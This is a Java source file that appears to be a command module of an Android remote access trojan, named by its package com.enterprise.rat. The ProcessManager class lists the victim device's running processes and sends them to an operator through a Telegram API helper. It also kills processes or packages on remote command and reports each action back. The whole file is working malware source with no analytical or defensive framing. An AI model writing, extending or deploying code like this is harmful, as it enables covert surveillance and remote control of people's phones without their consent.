package com.enterprise.rat.commands;

import android.app.ActivityManager;
import android.content.Context;
import android.os.Process;
import com.enterprise.rat.utils.TelegramApi;

public class ProcessManager {
    private Context context;
    public ProcessManager(Context context) { this.context = context; }

    public void listProcesses() {
        ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
        StringBuilder sb = new StringBuilder("<b>📊 Processes</b>\n\n");
        int i = 0;
        for (ActivityManager.RunningAppProcessInfo info : am.getRunningAppProcesses()) {
            if (i++ >= 30) break;
            sb.append("<code>").append(info.processName).append("</code> PID:").append(info.pid).append("\n");
        }
        TelegramApi.sendMessage(sb.toString());
    }

    public void killProcess(String pid) { try { Process.killProcess(Integer.parseInt(pid)); TelegramApi.sendMessage("✅ Killed PID " + pid); } catch (Exception e) {} }
    public void killPackage(String pkg) { ((ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE)).killBackgroundProcesses(pkg); TelegramApi.sendMessage("✅ Killed " + pkg); }
}
